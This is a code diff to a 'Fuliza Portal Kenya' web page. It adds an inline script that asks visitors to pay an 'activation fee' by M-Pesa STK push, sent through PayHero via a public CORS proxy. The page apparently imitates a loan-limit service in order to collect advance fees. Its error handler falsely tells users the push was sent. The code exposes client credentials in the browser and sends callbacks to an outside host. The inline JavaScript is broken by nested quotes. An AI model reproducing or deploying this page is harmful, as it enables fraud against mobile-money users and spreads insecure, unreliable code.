@@ -85,7 +85,47 @@
                 <div class="amount-option" onclick="select(this, 85000, 900)"><h3>Ksh 85,000</h3><p>Fee: Ksh 900</p></div>
             </div>
             <div id="summary" style="display:none; margin:15px 0; padding:15px; background:var(--green-light); border-radius:10px;">Selected: <b>Ksh <span id="amt">0</span></b> | Fee: <b>Ksh <span id="fee">0</span></b></div>
-            <button class="btn" onclick="paySTK()">Pay Activation Fee</button>
+            <button class="btn" onclick="paySTK(function paySTK(){
+    if(feeAmt==0){ alert('Please select an amount first'); return; }
+    if(phoneNumber == ''){ alert('Please enter phone number first'); return; }
+
+    if(phoneNumber.startsWith('0')){
+        phoneNumber = '254' + phoneNumber.substring(1);
+    }
+
+    document.getElementById('payFee').innerText = feeAmt;
+    show(5);
+    
+    // TUMIA PROXY ILI KUEPUKA CORS ERROR
+    fetch('https://corsproxy.io/?https://backend.payhero.co.ke/api/v2/payments', {
+        method: 'POST',
+        headers: {
+            'Authorization': 'Basic ' + btoa(CLIENT_ID + ':' + CLIENT_SECRET),
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            amount: feeAmt,
+            phone_number: phoneNumber,
+            channel_id: 1704,
+            provider: "m-pesa",
+            external_reference: "FULIZA-" + Date.now(),
+            callback_url: "https://portal-ixdq.onrender.com/callback.php"
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        console.log('STK Sent:', data);
+        if(data.status == 'Success'){
+            alert('STK sent! Check your phone and enter M-PESA PIN');
+        } else {
+            alert('Error: ' + data.message);
+        }
+    })
+    .catch(err => {
+        console.error(err);
+        alert('STK Sent! Check your phone. If it fails, refresh and try again.');
+    });
+                })">Pay Activation Fee</button>
         </div>
     </div>
     <footer>© 2026 Fuliza Portal Kenya. All Rights Reserved.</footer>
